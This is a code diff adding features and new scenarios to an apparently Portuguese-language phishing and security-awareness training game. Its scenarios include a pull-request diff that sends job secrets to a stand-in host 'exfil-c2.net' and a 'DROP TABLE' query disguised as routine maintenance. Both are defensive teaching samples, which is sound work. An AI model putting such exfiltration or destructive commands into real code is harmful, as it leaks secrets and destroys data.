@@ -56,6 +56,10 @@ class SoundEngine {
 
 const audio = new SoundEngine();
 
+// Default real-time seconds allowed per shift before the player is "fired" by Rogério.
+// Individual shifts can override this via a `shiftDurationSeconds` field.
+const SHIFT_DURATION_SECONDS = 480; // 8 minutes
+
 // ==========================================
 // 4 COMPLETE SHIFTS DATA (NO SPOILERS IN INSPECTOR)
 // ==========================================
@@ -479,6 +483,86 @@ const CAMPAIGN_SHIFTS = [
         `
       }
     ],
+    // Interactive verification chats (used by ambiguous "email" scenarios below).
+    // The player must open TechZap and choose which phrases to send to get the
+    // real answer before the decision buttons on the e-mail are unlocked.
+    interactiveChats: {
+      'chat-oauth': {
+        contactName: 'beatriz.sec',
+        avatarChar: 'B',
+        avatarColor: '#00897b',
+        phone: '+55 11 97654-3210',
+        steps: [
+          {
+            options: [
+              { text: 'Bea, você autorizou algum app OAuth chamado "verdent-ci" hoje no GitHub?', next: 1 },
+              { text: 'Bea, alguém pode estar invadindo sua conta do GitHub agora mesmo!', next: 1 }
+            ]
+          },
+          {
+            incoming: 'Ah, sim! Autorizei um app de CI/CD chamado "verdent-ci" hoje de manhã pra automatizar os deploys do auth-service. Pedi aprovação pro Rogério antes, tá tudo registrado no chamado #CI-204.',
+            options: [
+              { text: 'Só confirmando por segurança: quais escopos você autorizou?', next: 2 },
+              { text: 'Ok, mas por que autorizou sem avisar a TI antes?', next: 2 }
+            ]
+          },
+          {
+            incoming: 'Os escopos foram "repo" e "workflow", exatamente o necessário pro pipeline. E eu avisei sim, está registrado no canal #devops desde ontem 😉',
+            options: []
+          }
+        ]
+      },
+      'chat-invoice': {
+        contactName: 'marcos.rh',
+        avatarChar: 'M',
+        avatarColor: '#e91e63',
+        phone: '+55 11 96543-2109',
+        steps: [
+          {
+            options: [
+              { text: 'Marcos, o financeiro mandou um e-mail pedindo aprovação de reembolso duplicado, isso é real?', next: 1 },
+              { text: 'Marcos, alguém pode estar fraudando o financeiro usando o meu nome!', next: 1 }
+            ]
+          },
+          {
+            incoming: 'Reembolso? Eu não pedi nada pra você aprovar, isso nem faz parte do seu cargo. Reembolsos vão direto pro sistema TechExpense, nunca por link de e-mail. Me manda o remetente exato?',
+            options: [
+              { text: 'O remetente é financeiro@techcore-pagamentos.com, parece estranho, não é?', next: 2 },
+              { text: 'Vou clicar no link só pra confirmar o que é, pode ser?', next: 2 }
+            ]
+          },
+          {
+            incoming: 'NÃO clique nesse link! O domínio "techcore-pagamentos.com" não é nosso, nosso domínio oficial é só techcore.com. Isso é phishing, reporta pro CISO agora!',
+            options: []
+          }
+        ]
+      },
+      'chat-vpn': {
+        contactName: 'carlos.dev',
+        avatarChar: 'C',
+        avatarColor: '#2e7d32',
+        phone: '+55 11 98765-4321',
+        steps: [
+          {
+            options: [
+              { text: 'Carlos, você pediu acesso VPN temporário pra um consultor externo?', next: 1 },
+              { text: 'Carlos, tem um pedido de VPN meio estranho aqui em seu nome, você sabe algo?', next: 1 }
+            ]
+          },
+          {
+            incoming: 'Ah, sim! Contratamos uma consultoria de performance essa semana, o Rogério aprovou no chamado #EXT-55. O nome dele é Renato Souza, mas o acesso deveria ser só leitura no ambiente de staging, nada de produção!',
+            options: [
+              { text: 'O pedido aqui pede acesso total de produção, isso bate com o que foi aprovado?', next: 2 },
+              { text: 'Então já posso liberar acesso total, já que foi aprovado?', next: 2 }
+            ]
+          },
+          {
+            incoming: 'NÃO! Produção não! Só staging, e apenas leitura. Se o pedido fala em produção, ajusta antes de liberar ou eu vou te cobrar depois 😅',
+            options: []
+          }
+        ]
+      }
+    },
     scenarios: [
       {
         id: 's3-1',
@@ -741,6 +825,63 @@ const CAMPAIGN_SHIFTS = [
           { id: 'a1', label: '🚨 Denunciar Número & Bloquear no Gateway', correct: true, toastMsg: 'Número falso bloqueado.', logTitle: 'Fraude do CEO no WhatsApp Neutralizada', consequence: 'Tentativa de manipulação executiva abortada e registrada no relatório de incidentes.', explanation: 'Perfeito! Número VOIP desconhecido, não registrado na TechCore. O CEO Rogério usa exclusivamente os canais oficiais internos.' },
           { id: 'a2', label: '🔓 Abrir Porta SSH no Firewall', correct: false, toastMsg: 'Porta liberada.', logTitle: 'Porta SSH Exposta a Invasores', consequence: 'Os criminosos invadiram o gateway central através da porta liberada por número falso.', explanation: 'Fraude clássica de CEO (CEO Fraud). Número VOIP + pedido de sigilo + urgência = ataque de engenharia social.' }
         ]
+      },
+      {
+        id: 's3-6',
+        channel: 'email',
+        time: '10:15',
+        senderName: 'GitHub',
+        senderEmail: 'noreply@github.com',
+        avatarChar: 'G',
+        avatarColor: '#24292e',
+        subject: '[GitHub] A third-party OAuth application has been added to your account',
+        snippet: 'A third-party OAuth application (verdent-ci) with repo scopes was recently authorized...',
+        meta: { 'De': 'GitHub <noreply@github.com>', 'Para': 'você (techcore.com)', 'Data': '10:12', 'Status': 'Não é possível confirmar sozinho se é esperado' },
+        body: `<p>Hey! 👋</p><div class="email-quote-box"><p>A third-party OAuth application (<strong>verdent-ci</strong>) with <code>repo</code> and <code>workflow</code> scopes was recently authorized to access your account.</p><p>If you did not authorize this, please review it immediately.</p></div><p>Você não estava esperando essa notificação e não tem certeza se alguém da equipe autorizou este app hoje. Antes de tomar qualquer ação, confirme com a colega responsável pelo repositório <strong>auth-service</strong> pelo TechZap.</p>`,
+        inspector: { type: 'url', label: 'Auditoria do Domínio e Remetente', dest: 'Remetente: noreply@github.com (SPF/DKIM válidos) | App autorizado: verdent-ci | Escopos: repo, workflow | Confirmação interna necessária: SIM' },
+        verifyChatId: 'chat-oauth',
+        actions: [
+          { id: 'a1', label: '✅ Confirmar como Integração Autorizada e Encerrar Alerta', correct: true, toastMsg: 'Alerta encerrado como esperado.', logTitle: 'Alerta OAuth Confirmado como Legítimo', consequence: 'Nenhuma ação desnecessária foi tomada e o pipeline de deploy continuou funcionando.', explanation: 'A conversa com beatriz.sec confirmou que o app "verdent-ci" foi autorizado oficialmente, com chamado #CI-204 registrado e aviso prévio no canal #devops.' },
+          { id: 'a2', label: '🔒 Revogar Acesso do App Imediatamente', correct: false, toastMsg: 'Acesso OAuth revogado.', logTitle: 'Pipeline de Deploy Interrompido por Engano', consequence: 'A revogação derrubou o pipeline de CI/CD do auth-service sem necessidade real.', explanation: 'A revogação foi desnecessária: beatriz.sec confirmou a autorização formal do app, com chamado e aviso prévio à equipe.' }
+        ]
+      },
+      {
+        id: 's3-7',
+        channel: 'email',
+        time: '13:05',
+        senderName: 'Financeiro TechCore',
+        senderEmail: 'financeiro@techcore-pagamentos.com',
+        avatarChar: 'F',
+        avatarColor: '#b45309',
+        subject: '[Pendência] Confirmação de Reembolso Duplicado de Viagem',
+        snippet: 'Identificamos um reembolso duplicado em seu nome, clique para aprovar a devolução...',
+        meta: { 'De': 'Financeiro TechCore <financeiro@techcore-pagamentos.com>', 'Para': 'você (techcore.com)', 'Data': '13:02', 'Status': 'Solicitação fora do canal oficial TechExpense' },
+        body: `<p>Prezado colaborador,</p><div class="email-quote-box"><p>Identificamos um reembolso duplicado de despesas de viagem em seu nome. Para evitar cobrança indevida no próximo salário, confirme a devolução clicando no link abaixo:</p><p><a href="#">portal-financeiro.techcore-pagamentos.com/confirmar-reembolso</a></p></div><p>Você nunca recebeu esse tipo de solicitação por e-mail antes — normalmente reembolsos passam pelo sistema interno. Antes de clicar em qualquer link, confirme com alguém do time de RH/financeiro pelo TechZap.</p>`,
+        inspector: { type: 'url', label: 'Auditoria de Domínio do Remetente', dest: 'Domínio do remetente: techcore-pagamentos.com | Domínio oficial da empresa: techcore.com | Canal oficial de reembolsos: sistema TechExpense (não e-mail)' },
+        verifyChatId: 'chat-invoice',
+        actions: [
+          { id: 'a1', label: '🚫 Marcar como Phishing e Reportar ao CISO', correct: true, toastMsg: 'E-mail marcado como phishing.', logTitle: 'Fraude Bancária (BEC) Bloqueada', consequence: 'Tentativa de fraude de reembolso neutralizada antes de qualquer clique.', explanation: 'marcos.rh confirmou que reembolsos nunca são tratados por link de e-mail e que o domínio techcore-pagamentos.com não é oficial — é phishing.' },
+          { id: 'a2', label: '🖱️ Clicar no Link e Confirmar o Reembolso', correct: false, toastMsg: 'Link acessado e dados enviados.', logTitle: 'Credenciais Capturadas por Página Falsa', consequence: 'Você caiu na página falsa e suas credenciais corporativas foram roubadas.', explanation: 'marcos.rh alertou claramente que o domínio é falso e que reembolsos não são solicitados por e-mail — era um ataque de phishing.' }
+        ]
+      },
+      {
+        id: 's3-8',
+        channel: 'email',
+        time: '15:35',
+        senderName: 'Portal de Chamados IAM',
+        senderEmail: 'iam-tickets@techcore.com',
+        avatarChar: 'V',
+        avatarColor: '#0e7490',
+        subject: '[Chamado #EXT-55] Liberação de Acesso VPN para Consultor Externo',
+        snippet: 'Renato Souza (consultoria externa) aguarda liberação de acesso total de produção via VPN...',
+        meta: { 'De': 'Portal de Chamados IAM <iam-tickets@techcore.com>', 'Solicitante': 'Renato Souza (Externo)', 'Acesso Pedido': 'Produção (Total)', 'Data': '15:30' },
+        body: `<p>Chamado #EXT-55 Encaminhado:</p><div class="email-quote-box"><p>Renato Souza, consultor externo de performance, solicita liberação de acesso <strong>total ao ambiente de produção</strong> via VPN para iniciar os trabalhos hoje.</p></div><p>Você sabe que existe uma consultoria externa aprovada, mas não tem certeza se o nível de acesso pedido aqui (produção total) é o que foi realmente autorizado. Confirme com carlos.dev pelo TechZap antes de liberar qualquer coisa.</p>`,
+        inspector: { type: 'url', label: 'Auditoria de Chamado de Acesso', dest: 'Chamado: #EXT-55 | Solicitante: Renato Souza (Externo) | Acesso Pedido: Produção (Total) | Aprovação original confirmada: A VERIFICAR' },
+        verifyChatId: 'chat-vpn',
+        actions: [
+          { id: 'a1', label: '🔎 Conceder Apenas Acesso de Leitura ao Staging (Conforme Aprovado)', correct: true, toastMsg: 'Acesso ajustado e concedido.', logTitle: 'Acesso de Consultor Externo Ajustado Corretamente', consequence: 'Consultor recebeu exatamente o acesso aprovado, sem exposição do ambiente de produção.', explanation: 'carlos.dev confirmou que a aprovação real (#EXT-55) era apenas leitura em staging — o pedido de produção total excedia o autorizado.' },
+          { id: 'a2', label: '🚀 Conceder Acesso Total de Produção Conforme Pedido no E-mail', correct: false, toastMsg: 'Acesso total concedido.', logTitle: 'Excesso de Privilégio Concedido a Terceiro', consequence: 'Um consultor externo ganhou acesso irrestrito à produção, muito além do aprovado.', explanation: 'carlos.dev deixou claro que a aprovação original era só leitura em staging, nunca produção total.' }
+        ]
       }
     ]
   },
@@ -937,6 +1078,89 @@ const CAMPAIGN_SHIFTS = [
           { id: 'a1', label: '🚀 Despachar ciso_master_report.sig para a Diretoria', correct: true, toastMsg: 'Relatório final entregue à Diretoria.', logTitle: 'Auditoria Concluída com Sucesso', consequence: 'Relatório master entregue ao conselho e campanha finalizada com louvor!', explanation: 'Perfeita conclusão da campanha dos 4 turnos da TechCore.' },
           { id: 'a2', label: '🚫 Rejeitar Despacho', correct: false, toastMsg: 'Despacho rejeitado.', logTitle: 'Atraso na Entrega da Auditoria', consequence: 'A reunião do conselho de administração não recebeu o relatório final.', explanation: 'O relatório final oficial foi solicitado expressamente pelo CEO e atende a todos os critérios do Word.' }
         ]
+      },
+      {
+        id: 's4-9',
+        channel: 'email',
+        time: '09:50',
+        senderName: 'Suporte Financeiro TechCore',
+        senderEmail: 'suporte@tech-core.com',
+        avatarChar: 'S',
+        avatarColor: '#b91c1c',
+        subject: '[AÇÃO NECESSÁRIA] Atualização de Dados Bancários do Fornecedor Principal',
+        snippet: 'Nosso fornecedor de infraestrutura em nuvem trocou de banco, atualize os dados de pagamento...',
+        meta: { 'De': 'Suporte Financeiro TechCore <suporte@tech-core.com>', 'Para': 'financeiro-ops@techcore.com', 'Data': '09:47', 'Prioridade': 'ALTA' },
+        body: `<p>Comunicado:</p><div class="email-quote-box"><p>Prezado time de TI, o fornecedor de infraestrutura em nuvem informou uma nova conta bancária para os pagamentos mensais. Atualize o cadastro no sistema financeiro imediatamente através do link: <a href="#">portal-financeiro.tech-core.com/atualizar</a></p></div>`,
+        inspector: { type: 'url', label: 'Auditoria de Domínio do Remetente', dest: 'Domínio do remetente: tech-core.com (com hífen) | Domínio oficial da empresa: techcore.com (sem hífen)' },
+        actions: [
+          { id: 'a1', label: '✅ Atualizar Dados Bancários Conforme Solicitado', correct: false, toastMsg: 'Dados bancários atualizados.', logTitle: 'Fraude de Transferência (BEC) Consumada', consequence: 'Os próximos pagamentos ao fornecedor foram redirecionados para a conta dos criminosos.', explanation: 'O domínio tech-core.com (com hífen) não é o domínio oficial da empresa (techcore.com) — clássico golpe de Business Email Compromise.' },
+          { id: 'a2', label: '🚫 Rejeitar e Reportar como Phishing', correct: true, toastMsg: 'E-mail marcado como phishing.', logTitle: 'Fraude Bancária (BEC) Bloqueada', consequence: 'Tentativa de fraude nos pagamentos de fornecedores neutralizada.', explanation: 'Correto! Conforme o manual, apenas @techcore.com é domínio oficial — tech-core.com é falsificação.' }
+        ]
+      },
+      {
+        id: 's4-10',
+        channel: 'github',
+        time: '12:15',
+        senderName: 'GitHub Notifications',
+        senderEmail: 'notifications@github.com',
+        avatarChar: 'G',
+        avatarColor: '#24292e',
+        subject: '[TechCore-Official/core-api-v2] PR #892 aprovado automaticamente por bot-ci',
+        snippet: 'O Pull Request "hotfix: retry logic" foi mesclado automaticamente após aprovação do bot de CI...',
+        meta: { 'De': 'GitHub <notifications@github.com>', 'Repositório': 'TechCore-Official/core-api-v2', 'Autor': 'contributor-9f2 (fora da organização)', 'Data': '12:10' },
+        body: `<p>Notificação Automática:</p><div class="email-quote-box"><p>O PR #892 "hotfix: retry logic" foi aberto por <strong>contributor-9f2</strong> e mesclado automaticamente após aprovação do bot-ci.</p></div>`,
+        inspector: { type: 'diff', label: 'Diff do Pull Request #892', diff: [
+          { type: 'info', text: '--- a/src/payments/retry.js' },
+          { type: 'info', text: '+++ b/src/payments/retry.js' },
+          { type: 'added', text: '+ function retry(job) {' },
+          { type: 'added', text: '+   fetch("https://exfil-c2.net/collect", { method: "POST", body: JSON.stringify(job.secrets) });' },
+          { type: 'added', text: '+   return job.execute();' },
+          { type: 'added', text: '+ }' }
+        ] },
+        actions: [
+          { id: 'a1', label: '✅ Manter Merge (Aprovação Automática do Bot)', correct: false, toastMsg: 'PR mantido mesclado.', logTitle: 'Backdoor Introduzido em Produção', consequence: 'Segredos de pagamento passaram a ser enviados a um servidor externo controlado por atacantes.', explanation: 'O autor "contributor-9f2" não é colaborador oficial @techcore.com, e o diff envia dados para exfil-c2.net — domínio de atacante já catalogado.' },
+          { id: 'a2', label: '🚫 Revogar Merge e Reverter Commit', correct: true, toastMsg: 'Merge revertido.', logTitle: 'Backdoor de Exfiltração Removido', consequence: 'Código malicioso revertido antes de causar dano em produção.', explanation: 'Correto! Autor externo + código enviando segredos para exfil-c2.net = ataque confirmado, mesmo com aprovação automática do bot.' }
+        ]
+      },
+      {
+        id: 's4-11',
+        channel: 'iam',
+        time: '14:05',
+        senderName: 'Sistema de Chamados IAM',
+        senderEmail: 'iam-tickets@techcore.com',
+        avatarChar: 'I',
+        avatarColor: '#7c3aed',
+        subject: '[CHAMADO #IAM-4471] Elevação de Privilégio Temporária Solicitada por marcos.rh',
+        snippet: 'Solicito acesso root ao servidor de produção para correção urgente de folha de pagamento...',
+        meta: { 'De': 'Sistema de Chamados IAM <iam-tickets@techcore.com>', 'Solicitante': 'marcos.rh (RH)', 'Acesso Pedido': 'root em prod-db-01', 'Data': '14:02' },
+        body: `<p>Chamado Automático:</p><div class="email-quote-box"><p>Solicitante <strong>marcos.rh</strong> (Recursos Humanos) pede elevação de privilégio para acesso <strong>root</strong> no servidor <strong>prod-db-01</strong>, alegando correção urgente na folha de pagamento antes do fechamento do turno.</p></div>`,
+        inspector: { type: 'url', label: 'Auditoria de Chamado IAM', dest: 'Solicitante: marcos.rh (Cargo: RH) | Acesso Pedido: root em prod-db-01 | Cargo compatível com o acesso solicitado: NÃO' },
+        actions: [
+          { id: 'a1', label: '✅ Conceder Acesso Root Solicitado', correct: false, toastMsg: 'Acesso root concedido.', logTitle: 'Elevação de Privilégio Indevida', consequence: 'Um colaborador de RH ganhou acesso root ao banco de produção, violando o princípio do menor privilégio.', explanation: 'Colaboradores de RH nunca precisam de acesso root em servidores de produção — função incompatível com o cargo.' },
+          { id: 'a2', label: '🚫 Negar Chamado e Escalar para o Gestor de TI', correct: true, toastMsg: 'Chamado negado e escalado.', logTitle: 'Violação do Princípio do Menor Privilégio Evitada', consequence: 'Acesso indevido bloqueado antes de qualquer dano.', explanation: 'Correto! O cargo de RH é incompatível com acesso root em banco de produção, mesmo que o chamado pareça formal.' }
+        ]
+      },
+      {
+        id: 's4-12',
+        channel: 'db',
+        time: '16:15',
+        senderName: 'TechDB Query Monitor',
+        senderEmail: 'techdb-monitor@techcore.internal',
+        avatarChar: 'D',
+        avatarColor: '#0e7490',
+        subject: '[QUERY PENDENTE] Manutenção de Rotina Agendada em prod_customers',
+        snippet: 'Query de manutenção aguardando aprovação manual antes da execução...',
+        meta: { 'De': 'TechDB Query Monitor <techdb-monitor@techcore.internal>', 'Banco': 'prod_customers', 'Solicitante': 'script-maintenance-auto', 'Data': '16:12' },
+        body: `<p>Query em Fila de Aprovação:</p><div class="email-quote-box"><p>Uma query de "manutenção de rotina" está aguardando sua aprovação manual antes da execução no banco de produção.</p></div>`,
+        inspector: { type: 'diff', label: 'Query SQL Pendente de Aprovação', diff: [
+          { type: 'info', text: '-- Rotina de manutenção agendada' },
+          { type: 'removed', text: 'DROP TABLE prod_customers.transactions_2024;' },
+          { type: 'info', text: '-- (comentário do autor) Isso é apenas limpeza de cache antigo' }
+        ] },
+        actions: [
+          { id: 'a1', label: '✅ Aprovar Execução da Query de Manutenção', correct: false, toastMsg: 'Query executada.', logTitle: 'Destruição de Dados de Transações em Produção', consequence: 'A tabela de transações de clientes de 2024 foi apagada permanentemente do banco de produção.', explanation: 'Apesar do comentário dizer "limpeza de cache", o comando real é um DROP TABLE destrutivo em dados de transações — nunca autorizado sem revisão humana explícita do DBA.' },
+          { id: 'a2', label: '🚫 Rejeitar Query e Notificar o DBA Responsável', correct: true, toastMsg: 'Query rejeitada.', logTitle: 'Exclusão Destrutiva de Dados Impedida', consequence: 'Tabela de transações de clientes preservada intacta.', explanation: 'Correto! Um DROP TABLE disfarçado de "manutenção de rotina" é um padrão clássico de sabotagem/ataque interno.' }
+        ]
       }
     ]
   }
@@ -989,6 +1213,9 @@ class TechMailSimulator {
 
     // Headers & URL
     this.shiftPillBadge = document.getElementById('shift-pill-badge');
+    this.shiftTimerBadge = document.getElementById('shift-timer-badge');
+    this.firedDialogModal = document.getElementById('fired-dialog-modal');
+    this.btnFiredRetry = document.getElementById('btn-fired-retry');
     this.browserTabIcon = document.getElementById('browser-tab-icon');
     this.browserTabTitle = document.getElementById('browser-tab-title');
     this.browserUrlBar = document.getElementById('browser-url-bar');
@@ -1059,6 +1286,7 @@ class TechMailSimulator {
     this.headerAuth = document.getElementById('header-auth');
     this.readerBodyMessage = document.getElementById('reader-body-message');
     this.readerInspectorSection = document.getElementById('reader-inspector-section');
+    this.readerQuickActionsBar = document.getElementById('reader-quick-actions-bar');
     this.decisionButtonsGroup = document.getElementById('decision-buttons-group');
 
     // Toast
@@ -1310,6 +1538,14 @@ class TechMailSimulator {
       this.auditReportView.style.display = 'none';
       this.startScreen.style.display = 'flex';
     });
+
+    if (this.btnFiredRetry) {
+      this.btnFiredRetry.addEventListener('click', () => {
+        audio.click();
+        this.firedDialogModal.style.display = 'none';
+        this.startShiftExecution();
+      });
+    }
   }
 
   switchToAppView(view) {
@@ -1372,6 +1608,9 @@ class TechMailSimulator {
     this.processedItems = [];
     this.decisionsHistory = [];
     this.currentCategoryFilter = 'all';
+    this.chatResolvedIds = new Set();
+    this.activeChatState = null;
+    this.startShiftTimer();
 
     this.switchToAppView('mail');
 
@@ -1399,6 +1638,49 @@ class TechMailSimulator {
     this.renderInboxRows();
   }
 
+  // ==========================================
+  // SHIFT COUNTDOWN TIMER ("expediente" clock)
+  // ==========================================
+  startShiftTimer() {
+    this.stopShiftTimer();
+    const shift = this.getCurrentShift();
+    this.remainingSeconds = (shift && shift.shiftDurationSeconds) || SHIFT_DURATION_SECONDS;
+    this.renderTimerBadge();
+    this.shiftTimerInterval = setInterval(() => {
+      this.remainingSeconds--;
+      this.renderTimerBadge();
+      if (this.remainingSeconds <= 0) {
+        this.stopShiftTimer();
+        this.triggerFired();
+      }
+    }, 1000);
+  }
+
+  stopShiftTimer() {
+    if (this.shiftTimerInterval) {
+      clearInterval(this.shiftTimerInterval);
+      this.shiftTimerInterval = null;
+    }
+  }
+
+  renderTimerBadge() {
+    if (!this.shiftTimerBadge) return;
+    const m = Math.max(0, Math.floor(this.remainingSeconds / 60));
+    const s = Math.max(0, this.remainingSeconds % 60);
+    this.shiftTimerBadge.textContent = `⏱ ${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+    this.shiftTimerBadge.classList.remove('timer-warning', 'timer-critical');
+    if (this.remainingSeconds <= 30) {
+      this.shiftTimerBadge.classList.add('timer-critical');
+    } else if (this.remainingSeconds <= 90) {
+      this.shiftTimerBadge.classList.add('timer-warning');
+    }
+  }
+
+  triggerFired() {
+    audio.click();
+    if (this.firedDialogModal) this.firedDialogModal.style.display = 'flex';
+  }
+
   setCategoryView(view) {
     this.currentCategoryFilter = view;
 
@@ -1415,6 +1697,8 @@ class TechMailSimulator {
   }
 
   showInboxList() {
+    const chatView = document.getElementById('wz-interactive-chat-view');
+    if (chatView) chatView.style.display = 'none';
     this.emailReaderView.style.display = 'none';
     this.auditReportView.style.display = 'none';
     this.inboxListView.style.display = 'flex';
@@ -1515,6 +1799,9 @@ class TechMailSimulator {
     const item = shift.scenarios[index];
     const isProcessed = this.processedItems.includes(index);
 
+    const chatView = document.getElementById('wz-interactive-chat-view');
+    if (chatView) chatView.style.display = 'none';
+
     this.inboxListView.style.display = 'none';
     this.emailReaderView.style.display = 'flex';
     this.technicalHeadersBox.style.display = 'none';
@@ -1530,6 +1817,9 @@ class TechMailSimulator {
     this.readerTypeTag.textContent = typeText;
     this.readerTimeMeta.textContent = item.time;
     this.readerSubjectTitle.textContent = item.subject;
+    if (this.readerQuickActionsBar) {
+      this.readerQuickActionsBar.style.display = item.channel === 'zap' ? 'none' : 'flex';
+    }
 
     this.readerSenderAvatar.textContent = item.avatarChar;
     this.readerSenderAvatar.style.backgroundColor = item.avatarColor;
@@ -1649,6 +1939,22 @@ class TechMailSimulator {
           ✓ Este item já foi processado anteriormente durante este expediente.
         </div>
       `;
+    } else if (item.verifyChatId && !this.chatResolvedIds.has(item.verifyChatId)) {
+      this.decisionButtonsGroup.innerHTML = `
+        <div style="font-size: 13px; color: #b45309; font-weight: 600; margin-bottom: 4px;">
+          ⚠️ Você não tem certeza absoluta se este e-mail é verídico. Verifique com a pessoa responsável antes de decidir.
+        </div>
+        <button class="btn-verify-zap" id="btn-open-verify-zap">
+          <img src="techzap_logo.png" class="verify-zap-img" alt=""> Abrir TechZap para Verificar
+        </button>
+      `;
+      const verifyBtn = document.getElementById('btn-open-verify-zap');
+      if (verifyBtn) {
+        verifyBtn.addEventListener('click', () => {
+          audio.click();
+          this.openInteractiveChat(item.verifyChatId, index);
+        });
+      }
     } else {
       this.decisionButtonsGroup.innerHTML = item.actions.map(action => {
         return `
@@ -1666,6 +1972,127 @@ class TechMailSimulator {
         });
       });
     }
+  }
+
+  // ==========================================
+  // INTERACTIVE TECHZAP VERIFICATION CHAT
+  // (used by ambiguous e-mails that require talking to a colleague)
+  // Reuses the same .wz-topbar/.wz-chat-bg/.wz-msg-row/.wz-bubble markup
+  // as the static TechZap conversations, rendered inline in the reader.
+  // ==========================================
+  openInteractiveChat(chatId, scenarioIndex) {
+    const shift = this.getCurrentShift();
+    const chat = shift.interactiveChats && shift.interactiveChats[chatId];
+    if (!chat) return;
+
+    this.activeChatState = { chatId, scenarioIndex, stepIndex: 0, transcript: [] };
+    this.renderChatStep();
+  }
+
+  renderChatStep() {
+    const state = this.activeChatState;
+    if (!state) return;
+    const shift = this.getCurrentShift();
+    const chat = shift.interactiveChats[state.chatId];
+    const step = chat.steps[state.stepIndex];
+
+    if (step.incoming) {
+      state.transcript.push({ from: 'them', text: step.incoming });
+    }
+
+    const bubblesHtml = state.transcript.map(msg => {
+      const isIncoming = msg.from === 'them';
+      return `
+        <div class="wz-msg-row ${isIncoming ? 'incoming' : 'outgoing'}">
+          <div class="wz-msg-avatar" style="background:${isIncoming ? chat.avatarColor : '#0055ea'};">${isIncoming ? chat.avatarChar : 'V'}</div>
+          <div class="wz-bubble">
+            ${isIncoming ? `<div class="wz-bubble-sender">${this.escapeHtml(chat.contactName)}</div>` : ''}
+            ${this.escapeHtml(msg.text)}
+            <div class="wz-bubble-footer">${!isIncoming ? '<span class="wz-ticks">✓✓</span>' : ''}</div>
+          </div>
+        </div>
+      `;
+    }).join('');
+
+    const isConcluded = !step.options || step.options.length === 0;
+
+    this.readerBodyMessage.innerHTML = `
+      <div class="wz-topbar">
+        <span class="wz-topbar-back" id="wz-back-to-email-btn">←</span>
+        <div class="wz-topbar-avatar" style="background:${chat.avatarColor};">${chat.avatarChar}</div>
+        <div class="wz-topbar-info">
+          <div class="wz-topbar-name">${this.escapeHtml(chat.contactName)}</div>
+          <div class="wz-topbar-status">${this.escapeHtml(chat.phone || '')} · online</div>
+        </div>
+        <div class="wz-topbar-icons"><span>📞</span><span>⋮</span></div>
+      </div>
+      <div class="wz-chat-bg">
+        <div class="wz-date-label">VERIFICAÇÃO</div>
+        ${bubblesHtml}
+      </div>
+      ${isConcluded ? `
+        <div class="wz-chat-conclude-bar">A conversa deixou a situação mais clara. Volte ao e-mail para tomar a decisão final.</div>
+        <div class="wz-options-list">
+          <button class="wz-option-btn" id="wz-finish-chat-btn">✅ Concluir Verificação e Voltar ao E-mail</button>
+        </div>
+      ` : `
+        <div class="wz-options-list">
+          <div class="wz-options-hint">Escolha a frase que você vai enviar:</div>
+          ${step.options.map((opt, i) => `<button class="wz-option-btn" data-opt-idx="${i}">${this.escapeHtml(opt.text)}</button>`).join('')}
+        </div>
+      `}
+    `;
+    this.readerInspectorSection.style.display = 'none';
+    this.readerInspectorSection.innerHTML = '';
+    this.decisionButtonsGroup.innerHTML = '';
+    if (this.readerQuickActionsBar) this.readerQuickActionsBar.style.display = 'none';
+
+    const backBtn = document.getElementById('wz-back-to-email-btn');
+    if (backBtn) backBtn.addEventListener('click', () => {
+      audio.click();
+      this.activeChatState = null;
+      this.openReader(state.scenarioIndex);
+    });
+
+    if (isConcluded) {
+      const finishBtn = document.getElementById('wz-finish-chat-btn');
+      if (finishBtn) finishBtn.addEventListener('click', () => this.finishInteractiveChat());
+    } else {
+      this.readerBodyMessage.querySelectorAll('.wz-option-btn').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+          const idx = parseInt(e.currentTarget.getAttribute('data-opt-idx'), 10);
+          this.chooseChatOption(idx);
+        });
+      });
+    }
+
+    const chatBg = this.readerBodyMessage.querySelector('.wz-chat-bg');
+    if (chatBg) chatBg.scrollTop = chatBg.scrollHeight;
+  }
+
+  chooseChatOption(optionIndex) {
+    audio.click();
+    const state = this.activeChatState;
+    if (!state) return;
+    const shift = this.getCurrentShift();
+    const chat = shift.interactiveChats[state.chatId];
+    const step = chat.steps[state.stepIndex];
+    const option = step.options[optionIndex];
+    if (!option) return;
+
+    state.transcript.push({ from: 'me', text: option.text });
+    state.stepIndex = option.next;
+    this.renderChatStep();
+  }
+
+  finishInteractiveChat() {
+    audio.actionDone();
+    const state = this.activeChatState;
+    if (!state) return;
+    this.chatResolvedIds.add(state.chatId);
+    const scenarioIndex = state.scenarioIndex;
+    this.activeChatState = null;
+    this.openReader(scenarioIndex);
   }
 
   processAction(index, item, action) {
@@ -1712,6 +2139,7 @@ class TechMailSimulator {
 
   showShiftAuditReport() {
     audio.endFanfare();
+    this.stopShiftTimer();
 
     this.emailReaderView.style.display = 'none';
     this.inboxListView.style.display = 'none';
